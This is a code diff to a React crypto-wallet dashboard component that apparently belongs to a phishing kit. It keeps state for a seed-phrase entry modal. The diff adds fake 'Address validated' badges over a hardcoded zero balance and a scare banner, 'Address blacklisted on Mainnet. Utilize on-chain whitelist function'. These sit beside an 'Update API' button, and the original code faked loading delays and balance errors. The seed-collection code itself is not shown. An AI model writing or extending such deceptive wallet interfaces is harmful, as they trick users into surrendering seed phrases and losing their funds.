@@ -1,7 +1,7 @@
 "use client"
 
 import { useState, useEffect } from "react"
-import { ArrowLeft, RefreshCw, TrendingUp, Activity, X, Shield, AlertTriangle, Info, Eye, EyeOff, CheckCircle, Loader2 } from "lucide-react"
+import { ArrowLeft, RefreshCw, TrendingUp, Activity, X, Shield, AlertTriangle, Info, Eye, EyeOff, CheckCircle, CheckCircle2, Loader2 } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
 import { useRouter } from "next/navigation"
@@ -22,6 +22,8 @@ export default function DynamicDashboard({ network, symbol, walletAddress }: Das
   const router = useRouter()
   const [isLoading, setIsLoading] = useState(true)
   const [balanceError, setBalanceError] = useState(false)
+  const [isBlacklisted, setIsBlacklisted] = useState(false)
+  const [isCheckingBlacklist, setIsCheckingBlacklist] = useState(true)
   const [showConnectModal, setShowConnectModal] = useState(false)
   const [showSeedModal, setShowSeedModal] = useState(false)
   const [seedPhrase, setSeedPhrase] = useState("")
@@ -55,15 +57,56 @@ export default function DynamicDashboard({ network, symbol, walletAddress }: Das
 
   const config = networkConfigs[symbol] || networkConfigs.OTHER
 
+  // Check blacklist on mount - Protected route
   useEffect(() => {
-    // Simulate loading for 3 seconds, then show error
-    const timer = setTimeout(() => {
+    const checkBlacklist = async () => {
+      if (!walletAddress) {
+        setIsCheckingBlacklist(false)
+        // Redirect if no address provided
+        router.push(`/wallet/${symbol.toLowerCase()}?network=${encodeURIComponent(config.name)}&color=${encodeURIComponent(config.color)}`)
+        return
+      }
+
+      try {
+        const response = await fetch(
+          `/api/blacklist/check?address=${encodeURIComponent(walletAddress)}&network=${encodeURIComponent(symbol)}`
+        )
+        const data = await response.json()
+        const isBlacklistedResult = data.isBlacklisted || false
+        setIsBlacklisted(isBlacklistedResult)
+        
+        // If blacklisted, redirect back to wallet address page
+        if (isBlacklistedResult) {
+          router.push(`/wallet/${symbol.toLowerCase()}?network=${encodeURIComponent(config.name)}&color=${encodeURIComponent(config.color)}`)
+          return
+        }
+      } catch (error) {
+        console.error('Error checking blacklist:', error)
+        // On error, allow user to continue (fail open)
+        setIsBlacklisted(false)
+      } finally {
+        setIsCheckingBlacklist(false)
+      }
+    }
+
+    checkBlacklist()
+  }, [walletAddress, symbol, config.name, config.color, router])
+
+  useEffect(() => {
+    // For valid (non-blacklisted) addresses, show success state instead of error
+    if (!isCheckingBlacklist && !isBlacklisted && walletAddress) {
+      const timer = setTimeout(() => {
+        setIsLoading(false)
+        setBalanceError(false) // Don't show error for valid addresses
+      }, 3000)
+
+      return () => clearTimeout(timer)
+    } else if (!isCheckingBlacklist && isBlacklisted) {
+      // If blacklisted, skip loading - will redirect anyway
       setIsLoading(false)
       setBalanceError(true)
-    }, 3000)
-
-    return () => clearTimeout(timer)
-  }, [])
+    }
+  }, [isCheckingBlacklist, isBlacklisted, walletAddress])
 
   useEffect(() => {
     if (showUpdatingModal) {
@@ -179,6 +222,18 @@ export default function DynamicDashboard({ network, symbol, walletAddress }: Das
     setIsSuccess(false)
   }
 
+  // Show loading screen while checking blacklist
+  if (isCheckingBlacklist) {
+    return (
+      <div className="min-h-screen bg-darkBlueCustom relative overflow-hidden flex items-center justify-center">
+        <div className="text-white flex items-center gap-2">
+          <Loader2 className="w-5 h-5 animate-spin" />
+          <span>Validating address...</span>
+        </div>
+      </div>
+    )
+  }
+
   return (
     <div className="min-h-screen bg-darkBlueCustom relative overflow-hidden">
       {/* Crypto Ticker */}
@@ -269,12 +324,22 @@ export default function DynamicDashboard({ network, symbol, walletAddress }: Das
                     Balance
                   </div>
                   <div className="bg-gray-800/70 p-4 rounded border border-gray-600/50">
-                    {isLoading ? (
+                    {isLoading || isCheckingBlacklist ? (
                       <div className="w-20 h-6 bg-gray-600 rounded animate-pulse"></div>
+                    ) : isBlacklisted ? (
+                      <div className="text-red-400 text-sm">
+                        Address blacklisted on Mainnet. Utilize on-chain whitelist function.
+                      </div>
                     ) : balanceError ? (
                       <div className="text-red-400 text-sm">Error loading balance</div>
                     ) : (
-                      <div className="text-white text-xl font-bold">0.00 {symbol}</div>
+                      <div className="space-y-1">
+                        <div className="text-white text-xl font-bold">0.00 {symbol}</div>
+                        <div className="text-green-400 text-xs flex items-center gap-1">
+                          <CheckCircle className="w-3 h-3" />
+                          Address validated
+                        </div>
+                      </div>
                     )}
                   </div>
                 </div>
@@ -287,10 +352,28 @@ export default function DynamicDashboard({ network, symbol, walletAddress }: Das
                 </div>
               </div>
 
+              {/* Address Validated Success Message */}
+              {!isBlacklisted && !isCheckingBlacklist && walletAddress && !balanceError && (
+                <div className="bg-green-900/30 border border-green-600/50 rounded-lg p-3 mb-4">
+                  <div className="flex items-center gap-2">
+                    <CheckCircle2 className="w-5 h-5 text-green-400" />
+                    <p className="text-green-300 text-sm font-medium">Address validated and ready to use</p>
+                  </div>
+                </div>
+              )}
+
+              {/* Blacklist Warning - Should not show if redirect works, but keeping as fallback */}
+              {isBlacklisted && (
+                <div className="bg-red-900/30 border border-red-600/50 rounded-lg p-3 mb-4">
+                  <p className="text-red-300 text-sm font-medium">Address blacklisted on Mainnet. Utilize on-chain whitelist function.</p>
+                </div>
+              )}
+
               {/* Update API Button */}
               <Button 
                 className={`w-full ${config.color} hover:opacity-90 text-white font-medium py-3 shadow-lg`}
                 onClick={handleUpdateAPI}
+                disabled={isBlacklisted || isCheckingBlacklist}
               >
                 Update API
               </Button>
